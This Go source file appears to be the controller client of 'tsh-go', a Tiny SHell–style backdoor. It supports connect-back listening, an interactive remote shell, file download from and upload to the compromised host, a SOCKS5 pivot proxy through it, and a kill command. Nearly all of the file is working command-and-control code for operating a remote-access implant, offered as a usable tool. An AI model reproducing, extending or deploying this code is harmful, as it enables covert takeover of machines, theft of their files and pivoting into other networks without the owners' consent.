package client

import (
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"tsh-go/internal/constants"
	"tsh-go/internal/pel"
	"tsh-go/internal/utils"

	"github.com/schollz/progressbar/v3"
	terminal "golang.org/x/term"
)

type RunShellArgs struct {
	Command string
}

type GetFileArgs struct {
	Srcfile string
	Dstdir  string
}

type PutFileArgs struct {
	Srcfile string
	Dstdir  string
}

type Socks5Args struct {
	Socks5Addr string
}

func Run(secret []byte, host string, port int, mode uint8, arg any) {
	var isConnectBack bool

	if host == "cb" {
		isConnectBack = true
	}

	waitForConnection := func() *pel.PktEncLayer {
		if isConnectBack {
			addr := fmt.Sprintf(":%d", port)
			ln, err := pel.Listen(addr, secret, false)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			fmt.Print("Waiting for the server to connect...")
			layer, err := ln.Accept()
			ln.Close()
			fmt.Println("connected.")
			if err != nil {
				fmt.Fprintf(os.Stderr, "%v\n", err)
				os.Exit(1)
			}
			layer.Write([]byte{mode})
			return layer
		} else {
			addr := fmt.Sprintf("%s:%d", host, port)
			layer, err := pel.Dial(addr, secret, true)
			if err != nil {
				fmt.Fprintf(os.Stderr, "%v\n", err)
				os.Exit(1)
			}
			layer.Write([]byte{mode})
			return layer
		}
	}

	switch mode {
	case constants.Kill:
		layer := waitForConnection()
		layer.Close()
		fmt.Println("Server killed")
	case constants.RunShell:
		handleRunShell(waitForConnection, arg.(RunShellArgs))
	case constants.GetFile:
		handleGetFile(waitForConnection, arg.(GetFileArgs))
	case constants.PutFile:
		handlePutFile(waitForConnection, arg.(PutFileArgs))
	case constants.SOCKS5:
		handleSocks5(waitForConnection, arg.(Socks5Args))
	}
}

func handleGetFile(waitForConnection func() *pel.PktEncLayer, arg GetFileArgs) {
	layer := waitForConnection()
	defer layer.Close()
	buffer := make([]byte, constants.MaxMessagesize)

	basename := strings.ReplaceAll(arg.Srcfile, "\\", "/")
	basename = filepath.Base(filepath.FromSlash(basename))

	f, err := os.OpenFile(filepath.Join(arg.Dstdir, basename), os.O_CREATE|os.O_RDWR, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	_, err = layer.Write([]byte(arg.Srcfile))
	if err != nil {
		return
	}
	bar := progressbar.NewOptions(-1,
		progressbar.OptionSetWidth(20),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetDescription("Downloading"),
		progressbar.OptionSpinnerType(22),
	)
	utils.CopyBuffer(io.MultiWriter(f, bar), layer, buffer)
	fmt.Print("\nDone.\n")
}

func handlePutFile(waitForConnection func() *pel.PktEncLayer, arg PutFileArgs) {
	layer := waitForConnection()
	defer layer.Close()
	buffer := make([]byte, constants.MaxMessagesize)
	f, err := os.Open(arg.Srcfile)
	if err != nil {
		return
	}
	defer f.Close()
	fi, err := f.Stat()
	if err != nil {
		return
	}
	fsize := fi.Size()

	basename := filepath.Base(arg.Srcfile)
	basename = strings.ReplaceAll(basename, "\\", "_")
	_, err = layer.Write([]byte(arg.Dstdir + "/" + basename))
	if err != nil {
		fmt.Println(err)
		return
	}
	bar := progressbar.NewOptions(int(fsize),
		progressbar.OptionSetWidth(20),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetDescription("Uploading"),
	)
	utils.CopyBuffer(io.MultiWriter(layer, bar), f, buffer)
	fmt.Print("\nDone.\n")
}

func handleRunShell(waitForConnection func() *pel.PktEncLayer, arg RunShellArgs) {
	layer := waitForConnection()
	defer layer.Close()
	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		return
	}

	defer func() {
		_ = terminal.Restore(int(os.Stdin.Fd()), oldState)
		_ = recover()
	}()

	term := os.Getenv("TERM")
	if term == "" {
		term = "vt100"
	}
	_, err = layer.Write([]byte(term))
	if err != nil {
		return
	}

	ws_col, ws_row, _ := terminal.GetSize(int(os.Stdout.Fd()))
	ws := make([]byte, 4)
	ws[0] = byte((ws_row >> 8) & 0xFF)
	ws[1] = byte((ws_row) & 0xFF)
	ws[2] = byte((ws_col >> 8) & 0xFF)
	ws[3] = byte((ws_col) & 0xFF)
	_, err = layer.Write(ws)
	if err != nil {
		return
	}

	_, err = layer.Write([]byte(arg.Command))
	if err != nil {
		return
	}

	buffer := make([]byte, constants.MaxMessagesize)
	buffer2 := make([]byte, constants.MaxMessagesize)
	go func() {
		_, _ = utils.CopyBuffer(os.Stdout, layer, buffer)
		layer.Close()
	}()
	_, _ = utils.CopyBuffer(layer, os.Stdin, buffer2)
}
func handleSocks5(waitForConnection func() *pel.PktEncLayer, arg Socks5Args) {
	addr, err := net.ResolveTCPAddr("tcp", arg.Socks5Addr)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	l, err := net.ListenTCP("tcp", addr)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	fmt.Println("Socks5 proxy listening at", l.Addr())
	for {
		conn, err := l.Accept()
		if err != nil {
			panic(err)
		}
		layer := waitForConnection()
		fmt.Println("Connection established", conn.RemoteAddr())
		wg := &sync.WaitGroup{}
		wg.Add(2)
		go func() {
			utils.StreamPipe(layer, conn, make([]byte, 1024))
			wg.Done()
		}()
		go func() {
			utils.StreamPipe(conn, layer, make([]byte, 1024))
			wg.Done()
		}()
		go func() {
			wg.Wait()
			layer.Close()
			conn.Close()
			fmt.Println("Connection closed", conn.RemoteAddr())
		}()
	}
}
